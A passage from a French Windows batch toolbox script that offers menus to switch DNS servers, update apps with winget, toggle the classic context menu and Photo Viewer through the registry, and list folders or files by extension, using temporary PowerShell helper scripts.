set "map_install_cloudflare_full=DNS Cloudflare~1.1.1.1 / 1.0.0.1 (IPv4+IPv6)"
set "map_install_google_full=DNS Google~8.8.8.8 / 8.8.4.4 (IPv4+IPv6)"
set "map_restore_dns=Restaurer les DNS par defaut~Retour en mode DHCP automatique"
set "map_net_flush_dns=Nettoyer le cache des sites (DNS)~Force Windows a oublier les anciennes adresses pour corriger les sites inaccessibles"
set "map_net_display_dns=Voir les sites en cache~Affiche la liste des noms de domaines recemment consultes par votre PC"
set "map_net_clear_arp=Purger la table des appareils (ARP)~Oublie les anciennes connexions aux autres PC/Imprimantes de la maison"
set "map_net_display_arp=Lister les appareils voisins~Affiche l'identite technique (MAC) des machines connectees sur votre reseau"
set "map_net_renew_ip=Changer d'adresse IP locale~Demande une nouvelle adresse a votre box (corrige les conflits d'IP)"
set "map_net_reset_tcpip=Reinitialiser le protocole Internet~Remet a zero les reglages reseau profonds en cas de panne totale"
set "map_net_reset_winsock=Reparer la communication Windows~Nettoie les erreurs de communication apres un virus ou un gros bug"
set "map_net_reset_all=Grand Nettoyage Reseau~Combine plusieurs outils pour repartir sur une connexion toute neuve"
set "map_net_restart_adapters=Relancer les cartes reseau~Eteint et rallume le Wi-Fi et l'Ethernet sans redemarrer le PC"
set "map_net_fast_reset=Script d'Urgence internet~Enchaîne 7 reparations rapides pour retrouver la connexion immediatement"

if not exist "%SCRIPT_DIR%\favoris.txt" type nul > "%SCRIPT_DIR%\favoris.txt"

:menu_principal
cls
call :reload_fav_cache
set "opts=[--- MES FAVORIS ---]"
set /a fav_idx=0

for /l %%I in (1,1,%total_tools%) do (
    if defined t[%%I] (
        for /f "tokens=1,2,3 delims=:" %%A in ("!t[%%I]!") do (
            if not "%%A"=="---" (
                set "is_fav=0"
                if defined fav_%%A set "is_fav=1"
                if "!is_fav!"=="1" (
                    set "opts=!opts!;(F) %%B"
                    set /a fav_idx+=1
                    set "main_target[!fav_idx!]=%%A"
                )
            )
        )
    )
)

if "!opts!"=="[--- MES FAVORIS ---]" goto system_tools

set "opts=!opts!;[--- OUTILS AVANCES ---];Voir les outils systeme avances"

REM --- LANCEMENT DU MENU PRINCIPAL ---
:main_menu
call :DynamicMenu "BOITE A SCRIPTS WINDOWS - By ALEEXLEDEV" "!opts!"
set "main_choice=%errorlevel%"

if "!main_choice!"=="0" goto exit_script
if "!main_choice!"=="299" goto search_tools

if !main_choice! GEQ 200 (
    set /a toggle_idx=!main_choice!-200
    for %%X in (!toggle_idx!) do set "toggle_target=!main_target[%%X]!"
    if defined toggle_target if not "!toggle_target!"=="none" call :ToggleFav "!toggle_target!"
    goto menu_principal
)

set /a v_idx=fav_idx+1

if "!main_choice!"=="!v_idx!" goto system_tools

set "target=!main_target[%main_choice%]!"
if defined target if not "!target!"=="none" goto !target!
goto menu_principal

REM ===================================================================
REM                    GESTIONNAIRE DNS CLOUDFLARE
REM ===================================================================
:dns_manager
call :AutoMenu "GESTIONNAIRE DNS" "show_dns_config;[--- CLOUDFLARE ---];install_cloudflare_full;[--- GOOGLE ---];install_google_full;[--- REINITIALISATION ---];restore_dns"
if "%errorlevel%"=="0" goto system_tools
goto !AutoMenu_Target!

:install_cloudflare_full
cls
echo ================================================
echo     INSTALLATION DNS CLOUDFLARE (1.1.1.1)
echo ================================================
echo.

call :get_interface
if "%interface%"=="" (
    echo ERREUR: Aucune interface reseau active trouvee
    pause
    goto dns_manager
)

echo Interface reseau detectee: %interface%
echo.



echo Configuration des DNS Cloudflare IPv4 et IPv6...
net stop Dnscache /y >nul 2>&1
netsh interface ip set dns "%interface%" static 1.1.1.1 >nul 2>&1
netsh interface ip add dns "%interface%" 1.0.0.1 index=2 >nul 2>&1
netsh interface ipv6 set dns "%interface%" static 2606:4700:4700::1111 >nul 2>&1
netsh interface ipv6 add dns "%interface%" 2606:4700:4700::1001 index=2 >nul 2>&1
net start Dnscache >nul 2>&1

echo Vidage du cache DNS...
ipconfig /flushdns >nul

echo.
echo ================================================
echo     INSTALLATION TERMINEE AVEC SUCCES !
echo ================================================
echo.
echo DNS Cloudflare configures:
echo   IPv4 - Primaire: 1.1.1.1
echo   IPv4 - Secondaire: 1.0.0.1
echo   IPv6 - Primaire: 2606:4700:4700::1111
echo   IPv6 - Secondaire: 2606:4700:4700::1001
echo.
pause
goto dns_manager

:install_google_full
cls
echo ================================================
echo     INSTALLATION DNS GOOGLE (8.8.8.8)
echo ================================================
echo.

call :get_interface
if "%interface%"=="" (
    echo ERREUR: Aucune interface reseau active trouvee
    pause
    goto dns_manager
)

echo Interface reseau detectee: %interface%
echo.



echo Configuration des DNS Google IPv4 et IPv6...
net stop Dnscache /y >nul 2>&1
netsh interface ip set dns "%interface%" static 8.8.8.8 >nul 2>&1
netsh interface ip add dns "%interface%" 8.8.4.4 index=2 >nul 2>&1
netsh interface ipv6 set dns "%interface%" static 2001:4860:4860::8888 >nul 2>&1
netsh interface ipv6 add dns "%interface%" 2001:4860:4860::8844 index=2 >nul 2>&1
net start Dnscache >nul 2>&1

echo Vidage du cache DNS...
ipconfig /flushdns >nul

echo.
echo ================================================
echo     INSTALLATION TERMINEE AVEC SUCCES !
echo ================================================
echo.
echo DNS Google configures:
echo   IPv4 - Primaire: 8.8.8.8
echo   IPv4 - Secondaire: 8.8.4.4
echo   IPv6 - Primaire: 2001:4860:4860::8888
echo   IPv6 - Secondaire: 2001:4860:4860::8844
echo.
pause
goto dns_manager

:restore_dns
cls
echo ================================================
echo     RESTAURATION DNS PAR DEFAUT
echo ================================================
echo.

call :get_interface
if "%interface%"=="" (
    echo ERREUR: Aucune interface reseau active trouvee
    pause
    goto dns_manager
)

echo Interface reseau detectee: %interface%
echo.

echo Restauration des DNS automatiques (IPv4 et IPv6)...
net stop Dnscache /y >nul 2>&1
netsh interface ip set dns "%interface%" dhcp >nul 2>&1
netsh interface ipv6 set dns "%interface%" dhcp >nul 2>&1
net start Dnscache >nul 2>&1

echo Vidage du cache DNS...
ipconfig /flushdns >nul

echo.
echo ================================================
echo     DNS RESTAURES AVEC SUCCES !
echo ================================================
echo.
pause
goto dns_manager

:show_dns_config
cls
echo ================================================
echo     CONFIGURATION DNS ACTUELLE
echo ================================================
echo.

call :get_interface
if "%interface%"=="" (
    echo ERREUR: Aucune interface reseau active trouvee
    pause
    goto dns_manager
)

echo Interface reseau: %interface%
echo.
echo Configuration DNS IPv4:
netsh interface ip show dns "%interface%"
echo.
echo Configuration DNS IPv6:
netsh interface ipv6 show dns "%interface%"
echo.
pause
goto dns_manager

:get_interface
set "interface="
REM --- Priorite PowerShell (plus fiable que netsh) ---
for /f "usebackq delims=" %%I in (`powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.Virtual -eq $false } | Sort-Object -Property LinkSpeed -Descending | Select-Object -First 1 -ExpandProperty Name"`) do (
    set "interface=%%I"
)
if defined interface goto :interface_found
REM --- Fallback via netsh ---
for /f "skip=3 tokens=1,2,3*" %%a in ('netsh interface show interface') do (
    if /i "%%b"=="Connecté" ( set "interface=%%d" & goto :interface_found )
    if /i "%%b"=="Connected" ( set "interface=%%d" & goto :interface_found )
)
for /f "skip=3 tokens=1,2,3*" %%a in ('netsh interface show interface') do (
    if /i "%%c"=="Dédié" ( set "interface=%%d" & goto :interface_found )
    if /i "%%c"=="Dedicated" ( set "interface=%%d" & goto :interface_found )
)
:interface_found
goto :eof

REM ===================================================================
REM                   WINGET - Mises a jour des applications windows
REM ===================================================================
:winget_manager
call :AutoMenu "WINGET - MISES A JOUR APPLICATIONS" "update_single;update_all"
if "%errorlevel%"=="0" goto menu_principal
goto !AutoMenu_Target!

:update_single
cls
echo ================================================
echo     LISTE DES APPLICATIONS A METTRE A JOUR
echo ================================================
echo.
winget update
echo.
echo Copiez l'ID de l'application que vous souhaitez mettre a jour.
echo.
set /p app_id=Entrez l'ID de l'application: 

if "%app_id%"=="" (
    echo Aucun ID saisi.
    pause
    goto winget_manager
)

echo.
echo Mise a jour de %app_id% en cours...
winget update --id %app_id% --accept-package-agreements --accept-source-agreements
echo.
echo Termine.
pause
goto winget_manager

:update_all
cls
echo ================================================
echo     MISE A JOUR DE TOUTES LES APPLICATIONS
echo ================================================
echo.
winget update --all --accept-package-agreements --accept-source-agreements
echo.
echo Toutes les mises a jour ont ete appliquees.
pause
goto winget_manager

REM ===================================================================
REM                    MENU CONTEXTUEL WINDOWS 11
REM ===================================================================
:context_menu
call :AutoMenu "MENU CONTEXTUEL WINDOWS 11" "activate_classic;restore_modern"
if "%errorlevel%"=="0" goto menu_principal
goto !AutoMenu_Target!

:activate_classic
cls
echo.
echo Activation du menu contextuel classique...
echo.
reg add "HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32" /f /ve
echo Modification du registre terminee.
echo.
echo IMPORTANT : Un redemarrage de l'Explorateur Windows est necessaire.
echo.
> "%TEMP%\yn_confirm.ps1" echo $sel = 1
>> "%TEMP%\yn_confirm.ps1" echo function Show-Choice {
>> "%TEMP%\yn_confirm.ps1" echo     param($s)
>> "%TEMP%\yn_confirm.ps1" echo     $c = $host.UI.RawUI.CursorPosition; $c.X = 0; $host.UI.RawUI.CursorPosition = $c
>> "%TEMP%\yn_confirm.ps1" echo     Write-Host "  Redemarrer l'Explorateur maintenant ?  " -NoNewline
>> "%TEMP%\yn_confirm.ps1" echo     if ($s -eq 0) { Write-Host " OUI " -NoNewline -ForegroundColor Black -BackgroundColor Green; Write-Host "   NON  " -ForegroundColor DarkGray }
>> "%TEMP%\yn_confirm.ps1" echo     else          { Write-Host " OUI " -NoNewline -ForegroundColor DarkGray;                    Write-Host "   NON  " -ForegroundColor Black -BackgroundColor Red }
>> "%TEMP%\yn_confirm.ps1" echo }
>> "%TEMP%\yn_confirm.ps1" echo Show-Choice $sel
>> "%TEMP%\yn_confirm.ps1" echo while ($true) {
>> "%TEMP%\yn_confirm.ps1" echo     $k = [Console]::ReadKey($true)
>> "%TEMP%\yn_confirm.ps1" echo     if ($k.Key -eq 'LeftArrow' -or $k.Key -eq 'RightArrow') {
>> "%TEMP%\yn_confirm.ps1" echo         $sel = 1 - $sel
>> "%TEMP%\yn_confirm.ps1" echo         $c = $host.UI.RawUI.CursorPosition; $c.Y--; $host.UI.RawUI.CursorPosition = $c
>> "%TEMP%\yn_confirm.ps1" echo         Show-Choice $sel
>> "%TEMP%\yn_confirm.ps1" echo     } elseif ($k.Key -eq 'Enter') { break }
>> "%TEMP%\yn_confirm.ps1" echo     elseif ($k.Key -eq 'Escape') { $sel = 1; break }
>> "%TEMP%\yn_confirm.ps1" echo }
>> "%TEMP%\yn_confirm.ps1" echo Write-Host ""
>> "%TEMP%\yn_confirm.ps1" echo exit $sel
powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\yn_confirm.ps1"
set "_YN=%errorlevel%"
del /f /q "%TEMP%\yn_confirm.ps1" 2>nul
if "%_YN%"=="0" (
    echo Redemarrage de l'Explorateur Windows...
    taskkill /f /im explorer.exe >nul 2>&1
    timeout /t 2 /nobreak >nul
    start explorer.exe
    echo.
    echo Menu contextuel classique active avec succes !
) else (
    echo.
    echo Menu contextuel classique sera actif apres le redemarrage de l'Explorateur.
)
echo.
pause
goto context_menu

:restore_modern
cls
echo.
echo Restauration du menu contextuel moderne...
echo.
reg delete "HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}" /f >nul 2>&1
echo Modification du registre terminee.
echo.
> "%TEMP%\yn_confirm.ps1" echo $sel = 1
>> "%TEMP%\yn_confirm.ps1" echo function Show-Choice {
>> "%TEMP%\yn_confirm.ps1" echo     param($s)
>> "%TEMP%\yn_confirm.ps1" echo     $c = $host.UI.RawUI.CursorPosition; $c.X = 0; $host.UI.RawUI.CursorPosition = $c
>> "%TEMP%\yn_confirm.ps1" echo     Write-Host "  Redemarrer l'Explorateur maintenant ?  " -NoNewline
>> "%TEMP%\yn_confirm.ps1" echo     if ($s -eq 0) { Write-Host " OUI " -NoNewline -ForegroundColor Black -BackgroundColor Green; Write-Host "   NON  " -ForegroundColor DarkGray }
>> "%TEMP%\yn_confirm.ps1" echo     else          { Write-Host " OUI " -NoNewline -ForegroundColor DarkGray;                    Write-Host "   NON  " -ForegroundColor Black -BackgroundColor Red }
>> "%TEMP%\yn_confirm.ps1" echo }
>> "%TEMP%\yn_confirm.ps1" echo Show-Choice $sel
>> "%TEMP%\yn_confirm.ps1" echo while ($true) {
>> "%TEMP%\yn_confirm.ps1" echo     $k = [Console]::ReadKey($true)
>> "%TEMP%\yn_confirm.ps1" echo     if ($k.Key -eq 'LeftArrow' -or $k.Key -eq 'RightArrow') {
>> "%TEMP%\yn_confirm.ps1" echo         $sel = 1 - $sel
>> "%TEMP%\yn_confirm.ps1" echo         $c = $host.UI.RawUI.CursorPosition; $c.Y--; $host.UI.RawUI.CursorPosition = $c
>> "%TEMP%\yn_confirm.ps1" echo         Show-Choice $sel
>> "%TEMP%\yn_confirm.ps1" echo     } elseif ($k.Key -eq 'Enter') { break }
>> "%TEMP%\yn_confirm.ps1" echo     elseif ($k.Key -eq 'Escape') { $sel = 1; break }
>> "%TEMP%\yn_confirm.ps1" echo }
>> "%TEMP%\yn_confirm.ps1" echo Write-Host ""
>> "%TEMP%\yn_confirm.ps1" echo exit $sel
powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\yn_confirm.ps1"
set "_YN=%errorlevel%"
del /f /q "%TEMP%\yn_confirm.ps1" 2>nul
if "%_YN%"=="0" (
    echo Redemarrage de l'Explorateur Windows...
    taskkill /f /im explorer.exe >nul 2>&1
    timeout /t 2 /nobreak >nul
    start explorer.exe
    echo.
    echo Menu contextuel moderne restaure avec succes !
) else (
    echo.
    echo Menu contextuel moderne sera actif apres le redemarrage de l'Explorateur.
)
echo.
pause
goto context_menu

REM ===================================================================
REM                    VISIONNEUSE DE PHOTOS WINDOWS
REM ===================================================================
:photo_viewer_toggle
reg query "HKCR\Applications\photoviewer.dll\shell\open" >nul 2>&1
if %errorlevel%==0 (
    set "pv_state=on"
    set "pv_opts=Desactiver la Visionneuse~La visionneuse de photos Windows est actuellement ACTIVEE"
) else (
    set "pv_state=off"
    set "pv_opts=Activer la Visionneuse~La visionneuse de photos Windows est actuellement DESACTIVEE"
)
call :DynamicMenu "VISIONNEUSE DE PHOTOS WINDOWS" "!pv_opts!"
if "!errorlevel!"=="0" goto system_tools
if "!pv_state!"=="on" goto pv_disable
goto pv_enable

:pv_enable
setlocal
set "PV_CMD=%SystemRoot%\System32\rundll32.exe \"%ProgramFiles%\Windows Photo Viewer\PhotoViewer.dll\", ImageView_Fullscreen %%1"
reg add "HKCR\Applications\photoviewer.dll\shell\open" /v "MuiVerb" /t REG_SZ /d "@photoviewer.dll,-3043" /f >nul 2>&1
reg add "HKCR\Applications\photoviewer.dll\shell\open\command" /ve /t REG_EXPAND_SZ /d "%PV_CMD%" /f >nul 2>&1
reg add "HKCR\Applications\photoviewer.dll\shell\open\DropTarget" /v "Clsid" /t REG_SZ /d "{FFE2A43C-56B9-4bf5-9A79-CC6D4285608A}" /f >nul 2>&1
reg add "HKCR\Applications\photoviewer.dll\shell\print\command" /ve /t REG_EXPAND_SZ /d "%PV_CMD%" /f >nul 2>&1
reg add "HKCR\Applications\photoviewer.dll\shell\print\DropTarget" /v "Clsid" /t REG_SZ /d "{60fd46de-f830-4894-a628-6fa81bc0190d}" /f >nul 2>&1
echo.
echo   [OK] Visionneuse Windows activee.
echo   [i] Clic droit sur une image ^> "Ouvrir avec" pour la definir par defaut.
echo.
pause
endlocal
goto photo_viewer_toggle

:pv_disable
setlocal
reg delete "HKCR\Applications\photoviewer.dll" /f >nul 2>&1
echo.
echo   [OK] Visionneuse Windows desactivee.
echo.
pause
endlocal
goto photo_viewer_toggle

:list_folder_menu
set "opts=Lister le contenu complet (Arborescence);Rechercher fichiers par extension (Videos, Audios, etc.);Retour"
call :DynamicMenu "LISTING ET RECHERCHE PAR EXTENSIONS" "%opts%" "NONUMS"
if "%errorlevel%"=="0" goto system_tools
if "%errorlevel%"=="1" goto list_folder_all
if "%errorlevel%"=="2" goto list_folder_ext
goto system_tools

:list_folder_all
call :_lf_select_path
if not defined TMP_PATH goto list_folder_menu
set "_lf_path=%TMP_PATH%"
goto _lf_scan_tree

:list_folder_ext
call :_lf_select_path
if not defined TMP_PATH goto list_folder_menu
set "_lf_path=%TMP_PATH%"
goto _lf_scan_ext

:_lf_select_path
setlocal enabledelayedexpansion
REM -- Options fixes --
set "_lf_p[1]=ALL_DRIVES"
set "_lf_p[2]=%USERPROFILE%\Documents"
set "_lf_p[3]=%USERPROFILE%\Desktop"
set "_lf_p[4]=%USERPROFILE%\Downloads"
set "_lf_p[5]=%USERPROFILE%\Videos"
set "_lf_p[6]=%USERPROFILE%\Music"
set "_lf_p[7]=%USERPROFILE%\Pictures"
set "_lf_cnt=7"
set "_lf_opts=Tous emplacements locaux~Scanner tous les disques;Documents~%USERPROFILE%\Documents;Bureau~%USERPROFILE%\Desktop;Telechargements~%USERPROFILE%\Downloads;Videos~%USERPROFILE%\Videos;Musique~%USERPROFILE%\Music;Images~%USERPROFILE%\Pictures"

set "_lf_drv_ps=%TEMP%\lf_drv_%RANDOM%.ps1"
set "_lf_drv_txt=%TEMP%\lf_drv_%RANDOM%.txt"
>  "!_lf_drv_ps!" echo $types = @{2='Amovible';3='Disque';4='Reseau';5='CD-ROM'}
>> "!_lf_drv_ps!" echo Get-CimInstance Win32_LogicalDisk ^| Where-Object { $_.DeviceID -ne 'C:' } ^| ForEach-Object {
>> "!_lf_drv_ps!" echo     $t = $types[[int]$_.DriveType]; if (-not $t) { $t = 'Lecteur' }
>> "!_lf_drv_ps!" echo     $lbl = if ($_.VolumeName) { $_.VolumeName } else { $_.DeviceID }
>> "!_lf_drv_ps!" echo     Write-Output ("$($_.DeviceID) - $lbl ($t)~$($_.DeviceID)\")
>> "!_lf_drv_ps!" echo }
powershell -NoProfile -ExecutionPolicy Bypass -File "!_lf_drv_ps!" > "!_lf_drv_txt!" 2>nul
del /f /q "!_lf_drv_ps!" 2>nul
for /f "usebackq delims=" %%L in ("!_lf_drv_txt!") do (
    set /a "_lf_cnt+=1"
    for /f "tokens=1* delims=~" %%A in ("%%L") do set "_lf_p[!_lf_cnt!]=%%B"
    set "_lf_opts=!_lf_opts!;%%L"
)
del /f /q "!_lf_drv_txt!" 2>nul
set /a "_lf_ret=_lf_cnt+1"
set "_lf_opts=!_lf_opts!;[---];Retour"

:_lf_sel_loop
call :DynamicMenu "SELECTIONNER UN EMPLACEMENT" "!_lf_opts!" "NONUMS"
set "_lf_sel=!errorlevel!"
set "TMP_PATH="
if "!_lf_sel!"=="0"          ( endlocal & goto :eof )
if "!_lf_sel!"=="!_lf_ret!"  ( endlocal & goto :eof )
if "!_lf_sel!"=="1"  set "TMP_PATH=!_lf_p[1]!"
if "!_lf_sel!"=="2"  set "TMP_PATH=!_lf_p[2]!"
if "!_lf_sel!"=="3"  set "TMP_PATH=!_lf_p[3]!"
if "!_lf_sel!"=="4"  set "TMP_PATH=!_lf_p[4]!"
if "!_lf_sel!"=="5"  set "TMP_PATH=!_lf_p[5]!"
if "!_lf_sel!"=="6"  set "TMP_PATH=!_lf_p[6]!"
if "!_lf_sel!"=="7"  set "TMP_PATH=!_lf_p[7]!"
if "!_lf_sel!"=="8"  set "TMP_PATH=!_lf_p[8]!"
if "!_lf_sel!"=="9"  set "TMP_PATH=!_lf_p[9]!"
if "!_lf_sel!"=="10" set "TMP_PATH=!_lf_p[10]!"
if "!_lf_sel!"=="11" set "TMP_PATH=!_lf_p[11]!"
if "!_lf_sel!"=="12" set "TMP_PATH=!_lf_p[12]!"
if "!_lf_sel!"=="13" set "TMP_PATH=!_lf_p[13]!"
if "!_lf_sel!"=="14" set "TMP_PATH=!_lf_p[14]!"
if "!_lf_sel!"=="15" set "TMP_PATH=!_lf_p[15]!"
if "!_lf_sel!"=="16" set "TMP_PATH=!_lf_p[16]!"
if not defined TMP_PATH goto _lf_sel_loop
if "!TMP_PATH!" neq "ALL_DRIVES" (
    if not exist "!TMP_PATH!\" (
        echo.
        echo  [!] Dossier introuvable.
        pause
        goto _lf_sel_loop
    )
)
for /f "delims=" %%A in ("!TMP_PATH!") do (
    endlocal
    set "TMP_PATH=%%~A"
)
goto :eof

:_lf_scan_tree
setlocal enabledelayedexpansion
cls
echo  [~] Analyse recursive : !_lf_path!
echo.
set "LF_PS=%TEMP%\list_folder_%RANDOM%.ps1"
>  "!LF_PS!" echo $path = '!_lf_path!'
>> "!LF_PS!" echo $paths = if ($path -eq 'ALL_DRIVES') { @((Get-CimInstance Win32_LogicalDisk ^| Where-Object { $_.DriveType -eq 3 -or $_.DriveType -eq 2 }).DeviceID ^| ForEach-Object { "$_\" }) } else { @($path) }
>> "!LF_PS!" echo $base = if ($path -eq 'ALL_DRIVES') { 'TousLesDisques' } else { $path.TrimEnd('\') }
>> "!LF_PS!" echo $leaf = if ($path -eq 'ALL_DRIVES') { 'Tous_Les_Disques' } else { Split-Path $base -Leaf }
>> "!LF_PS!" echo if (-not $leaf) { $leaf = $base }
>> "!LF_PS!" echo $leaf = $leaf -replace '[:\\/:*?"^<^>^|]', ''
>> "!LF_PS!" echo $stamp = Get-Date -Format 'yyyyMMdd_HHmm'
>> "!LF_PS!" echo $out = Join-Path '!SCRIPT_DIR!' "Liste_${leaf}_${stamp}.txt"
>> "!LF_PS!" echo while ([System.Console]::KeyAvailable) { [System.Console]::ReadKey($true) ^| Out-Null }
>> "!LF_PS!" echo Write-Host "  [~] Scan en cours... (Appuyez sur ECHAP pour annuler)" -ForegroundColor Cyan
>> "!LF_PS!" echo $sep = '=' * 70
>> "!LF_PS!" echo Write-Host $sep
>> "!LF_PS!" echo Write-Host "  Dossier : $path"
>> "!LF_PS!" echo Write-Host "  Date    : $(Get-Date -Format 'dd/MM/yyyy HH:mm')"
>> "!LF_PS!" echo Write-Host $sep
>> "!LF_PS!" echo Write-Host ""
>> "!LF_PS!" echo function Show-Tree {
>> "!LF_PS!" echo     param($p, $pre = '', $depth = 1)
>> "!LF_PS!" echo     if ($depth -gt 10) {
>> "!LF_PS!" echo         $l = $pre + '\-- [!] ON NE DESCEND PAS EN DESSOUS DE 10 DOSSIERS'
>> "!LF_PS!" echo         Write-Host $l -ForegroundColor Red
>> "!LF_PS!" echo         $script:lines.Add($l)
>> "!LF_PS!" echo         return
>> "!LF_PS!" echo     }
>> "!LF_PS!" echo     try { $ch = @(Get-ChildItem -LiteralPath $p -Directory -ErrorAction SilentlyContinue ^| Sort-Object Name) } catch { return }
>> "!LF_PS!" echo     for ($i = 0; $i -lt $ch.Count; $i++) {
>> "!LF_PS!" echo         if ([System.Console]::KeyAvailable) {
>> "!LF_PS!" echo             $k = [System.Console]::ReadKey($true)
>> "!LF_PS!" echo             if ($k.Key -eq [System.ConsoleKey]::Escape) {
>> "!LF_PS!" echo                 if (-not $script:cancelled) { Write-Host "  [X] Annulation en cours..." -ForegroundColor Red }
>> "!LF_PS!" echo                 $script:cancelled = $true
>> "!LF_PS!" echo                 return
>> "!LF_PS!" echo             }
>> "!LF_PS!" echo         }
>> "!LF_PS!" echo         if ($script:cancelled) { return }
>> "!LF_PS!" echo         $script:totalCount++
>> "!LF_PS!" echo         $last = ($i -eq $ch.Count - 1)
>> "!LF_PS!" echo         $conn = if ($last) { '\-- ' } else { '+-- ' }
>> "!LF_PS!" echo         $next = if ($last) { $pre + '    ' } else { $pre + '^|   ' }
>> "!LF_PS!" echo         $l = $pre + $conn + $ch[$i].Name.ToUpper()
>> "!LF_PS!" echo         Write-Host $l
>> "!LF_PS!" echo         $script:lines.Add($l)
>> "!LF_PS!" echo         Show-Tree -p $ch[$i].FullName -pre $next -depth ($depth + 1)
>> "!LF_PS!" echo     }
>> "!LF_PS!" echo }
>> "!LF_PS!" echo $script:cancelled = $false
>> "!LF_PS!" echo $script:totalCount = 0
>> "!LF_PS!" echo $script:lines = New-Object System.Collections.Generic.List[System.String]
>> "!LF_PS!" echo foreach ($p in $paths) {
>> "!LF_PS!" echo     $rootLabel = if ($path -eq 'ALL_DRIVES') { $p } elseif ($leaf) { $leaf } else { $base }
>> "!LF_PS!" echo     $rSep = if ($rootLabel.EndsWith('\')) { '' } else { '\' }
>> "!LF_PS!" echo     $rootDir = $rootLabel.ToUpper() + $rSep
>> "!LF_PS!" echo     Write-Host $rootDir
>> "!LF_PS!" echo     $script:lines.Add($rootDir)
>> "!LF_PS!" echo     try { Show-Tree -p $p } catch { Write-Host "  [!] Erreur fatale : $_" -ForegroundColor Red }
>> "!LF_PS!" echo }
>> "!LF_PS!" echo $total = $script:totalCount
>> "!LF_PS!" echo Write-Host ""
>> "!LF_PS!" echo Write-Host "  Sous-dossiers trouves : $total" -ForegroundColor Yellow
>> "!LF_PS!" echo $header  = @()
>> "!LF_PS!" echo $header += $sep
>> "!LF_PS!" echo $header += "  Dossier : $path"
>> "!LF_PS!" echo $header += "  Date    : $(Get-Date -Format 'dd/MM/yyyy HH:mm')"
>> "!LF_PS!" echo $header += "  Sous-dossiers : $total"
>> "!LF_PS!" echo $header += $sep
>> "!LF_PS!" echo $header += ""
>> "!LF_PS!" echo $all = $header + $script:lines.ToArray() + @('', $sep)
>> "!LF_PS!" echo $sel = 0
>> "!LF_PS!" echo function Show-Choice {
>> "!LF_PS!" echo     param($s)
>> "!LF_PS!" echo     $c = $host.UI.RawUI.CursorPosition; $c.X = 0; $host.UI.RawUI.CursorPosition = $c
>> "!LF_PS!" echo     Write-Host "  Exporter la liste en TXT ?  " -NoNewline
>> "!LF_PS!" echo     if ($s -eq 0) { Write-Host " OUI " -NoNewline -ForegroundColor Black -BackgroundColor Green; Write-Host "   NON  " -ForegroundColor DarkGray }
>> "!LF_PS!" echo     else          { Write-Host " OUI " -NoNewline -ForegroundColor DarkGray;                    Write-Host "   NON  " -ForegroundColor Black -BackgroundColor Red }
>> "!LF_PS!" echo }
>> "!LF_PS!" echo Write-Host ""
>> "!LF_PS!" echo Show-Choice $sel
>> "!LF_PS!" echo while ($true) {
>> "!LF_PS!" echo     $k = [Console]::ReadKey($true)
>> "!LF_PS!" echo     if ($k.Key -eq 'LeftArrow' -or $k.Key -eq 'RightArrow') {
>> "!LF_PS!" echo         $sel = 1 - $sel
>> "!LF_PS!" echo         $c = $host.UI.RawUI.CursorPosition; $c.Y--; $host.UI.RawUI.CursorPosition = $c
>> "!LF_PS!" echo         Show-Choice $sel
>> "!LF_PS!" echo     } elseif ($k.Key -eq 'Enter') { break }
>> "!LF_PS!" echo     elseif ($k.Key -eq 'Escape') { $sel = 1; break }
>> "!LF_PS!" echo }
>> "!LF_PS!" echo Write-Host ""
>> "!LF_PS!" echo if ($sel -eq 0) {
>> "!LF_PS!" echo     $all ^| Out-File -FilePath $out -Encoding UTF8
>> "!LF_PS!" echo     Write-Host "  [OK] Exporte : $out" -ForegroundColor Green
>> "!LF_PS!" echo     Start-Sleep -Seconds 1
>> "!LF_PS!" echo     Invoke-Item $out
>> "!LF_PS!" echo     exit 0
>> "!LF_PS!" echo } else { exit 1 }
powershell -NoProfile -ExecutionPolicy Bypass -File "!LF_PS!"
del /f /q "!LF_PS!" 2>nul
echo.
pause
endlocal & goto list_folder_menu

:_lf_scan_ext
setlocal enabledelayedexpansion
:ext_menu_loop
set "ext_opts=Toutes les extensions (*.*);Videos (.mp4, .mkv, .avi...);Audios (.mp3, .wav...);Documents (.pdf, .docx...);Images (.jpg, .png...);Archives (.zip, .rar...);Executables (.exe, .msi...);Autres Extensions...;Retour"
call :DynamicMenu "RECHERCHE EXTENSIONS : !_lf_path!" "!ext_opts!" "NONUMS"
set "ext_sel=!errorlevel!"
if "!ext_sel!"=="0" (endlocal & goto list_folder_menu)
if "!ext_sel!"=="9" (endlocal & goto list_folder_menu)

set "ext_filter="
set "ext_name="
if "!ext_sel!"=="1" (set "ext_filter=*.*" & set "ext_name=TousFichiers")
if "!ext_sel!"=="2" (set "ext_filter=*.mp4,*.mkv,*.avi,*.mov,*.wmv" & set "ext_name=Videos")
if "!ext_sel!"=="3" (set "ext_filter=*.mp3,*.wav,*.flac,*.m4a,*.ogg" & set "ext_name=Audios")
if "!ext_sel!"=="4" (set "ext_filter=*.pdf,*.docx,*.xlsx,*.pptx,*.txt" & set "ext_name=Documents")
if "!ext_sel!"=="5" (set "ext_filter=*.jpg,*.jpeg,*.png,*.gif,*.bmp,*.webp" & set "ext_name=Images")
if "!ext_sel!"=="6" (set "ext_filter=*.zip,*.rar,*.7z,*.tar,*.gz" & set "ext_name=Archives")
if "!ext_sel!"=="7" (set "ext_filter=*.exe,*.bat,*.ps1,*.msi,*.cmd" & set "ext_name=Executables")
if "!ext_sel!"=="8" (
    cls
    echo.
    echo  Entrez les extensions separees par des virgules (ex: *.txt,*.csv)
    set /p "ext_filter=  > "
    if not defined ext_filter goto ext_menu_loop
    set "ext_name=Personnalises"
)

cls
echo  [~] Recherche des fichiers !ext_name! dans : !_lf_path!
echo  [.] Initialisation du moteur de scan... (Lancement automatique)
echo.
set "LF_PS=%TEMP%\list_ext_%RANDOM%.ps1"
>  "!LF_PS!" echo $path = '!_lf_path!'
>> "!LF_PS!" echo $paths = if ($path -eq 'ALL_DRIVES') { @((Get-CimInstance Win32_LogicalDisk ^| Where-Object { $_.DriveType -eq 3 -or $_.DriveType -eq 2 }).DeviceID ^| ForEach-Object { "$_\" }) } else { @($path) }
>> "!LF_PS!" echo $filters = '!ext_filter!' -split ',' ^| ForEach-Object { "$($_.Trim())" }
